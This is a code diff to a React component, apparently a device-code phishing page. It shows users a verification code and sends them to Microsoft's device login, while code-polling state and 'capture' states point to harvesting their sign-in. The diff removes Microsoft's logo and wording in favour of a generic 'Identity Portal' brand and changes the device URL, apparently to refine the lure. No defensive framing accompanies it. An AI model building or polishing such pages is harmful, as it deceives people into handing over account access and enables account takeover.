@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -82,7 +82,7 @@ export function MicrosoftVerifyTemplate(): React.ReactElement {
     navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
   }
 
-  function handleVerify(): void { setState('waiting'); window.open(DEVICE_AUTH_URL, '_blank'); }
+  function handleVerify(): void { setState('waiting'); window.open(DEVICE_VERIFY_URL, '_blank'); }
 
   function handleReset(): void {
     stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
@@ -95,13 +95,10 @@ export function MicrosoftVerifyTemplate(): React.ReactElement {
     <div className="ms-verify-page">
       <div className="ms-verify-container">
         <div className="ms-verify-logo">
-          <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
-            <rect width="11" height="11" fill="#f25022" />
-            <rect x="12" width="11" height="11" fill="#7fba00" />
-            <rect y="12" width="11" height="11" fill="#00a4ef" />
-            <rect x="12" y="12" width="11" height="11" fill="#ffb900" />
-            <text x="28" y="17" fill="#5e5e5e" fontSize="16" fontFamily="Segoe UI, sans-serif" fontWeight="600">Microsoft</text>
-          </svg>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
+            <span style={{ fontSize: 18, fontWeight: 600, color: '#5e5e5e' }}>Identity Portal</span>
+          </div>
         </div>
 
         {state === 'idle' && (
@@ -110,7 +107,7 @@ export function MicrosoftVerifyTemplate(): React.ReactElement {
             <p>To protect your account, we need to verify your identity. Click below to receive a verification code.</p>
             <div className="ms-verify-info-box">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
-              <span>This is a secure Microsoft verification process</span>
+              <span>This is a secure identity verification process</span>
             </div>
             <button className="ms-verify-btn" onClick={handleStart}>
               Send verification code
